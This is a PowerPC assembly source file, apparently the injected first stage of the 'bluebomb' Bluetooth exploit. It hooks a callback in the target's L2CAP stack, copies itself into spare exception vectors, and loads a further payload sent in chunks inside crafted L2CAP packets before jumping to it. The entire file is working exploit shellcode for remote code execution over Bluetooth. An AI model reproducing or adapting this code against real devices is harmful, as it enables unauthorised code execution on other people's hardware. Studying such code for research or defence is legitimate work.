/*  Copyright 2019-2020  Dexter Gerig  <dexgerig@gmail.com>
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

# Registers:
# 15: l2cb
# 16: our l2cap packet
# 17: size of the data of the packet
# 25: ID field of the packet

	.globl _start
_start:
	mflr 11 # 0x0
	bl _realstart # 0x4
payload_addr:
	.long 0x00000000 # 0x8 Filled in by bluebomb before being sent
	nop # 0xc Overwritten during exploit
	
_realstart:
	mflr 10
	subi 10, 10, 0x8 # Get the _start
	
	# Now we copy our selves to the empty interrupt execption vectors as a place to live without trashing something.
	mr 4, 10
	lis 3, dest@h ; ori 3, 3, dest@l
	lis 5, (_end - _start)@h ; ori 5, 5, (_end - _start)@l
	bl memcpy
	lis 4, (_end - _start)@h ; ori 4, 4, (_end - _start)@l
	bl store_region
	
	# write the payload_addr to the payload_offset
	lis 3, payload_addr@h ; ori 3, 3, payload_addr@l
	lis 4, payload_offset@h ; ori 4, 4, payload_offset@l
	lwz 5, 0(3)
	stw 5, 0(4)
	
	# Return with 'S0'
	li 6, 0x5330
	b return_from_call

jump_payload:
	lis 3, payload_addr@h ; ori 3, 3, payload_addr@l
	lwz 3, 0(3)
	mtctr 3
	bctr

hook:
	mflr 11
	
	# compare ID field of packet, 0 == append to payload, 1 == jump to payload
	cmpwi 25, 1
	beq jump_payload
	
	lis 3, payload_offset@h ; ori 3, 3, payload_offset@l
	lwz 4, 0(3)
	
	# go ahead and increment it now
	add 0, 4, 17
	stw 0, 0(3)
	
	# copy in new part of payload
	mr 3, 4
	addi 4, 16, 4
	mr 5, 17
	bl memcpy
	mr 4, 17
	bl store_region
	
	# return from the call with 'GD'
	li 6, 0x4744
	
return_from_call:
	# Patch ourselves back in, this is unset whenever we are called so we have to do it.
	# r15 is from process_l2cap_cmd and is a pointer to the l2cb
	addi 3, 15, 0x54
	lis 4, hook@h ; ori 4, 4, hook@l
	stw 4, 0(3)
	
	# We just return onto a call to l2cu_reject_connection
	# Since we have a pointer into process_l2cap_cmd we just
	# subtract a offset to get to one of the calls
	# To my knowledge there are no variations of this function
	# so this should be fine to do.
	mr 3, 15
	li 4, 0
	li 5, 0
	subi 11, 11, 0x07AC
	
	mtlr 11
	blr

store_region:
	li 5, 31
	rlwinm 3, 3, 0, 0, 26
	add 4, 4, 5
	srwi 4, 4, 5
	mtctr 4
0:	dcbst 0, 3
	sync
	icbi 0, 3
	addi  3, 3, 32
	bdnz 0b
	sync
	isync
	blr

# Clobbers r6, be careful
memcpy:
	mr 6, 3
	mtctr 5
	subi 3, 3, 1
	subi 4, 4, 1
1:	lbzu 0, 1(4)
	stbu 0, 1(3)
	bdnz 1b
	mr 3, 6
	blr

payload_offset:
	.long 0x00000000

_end:
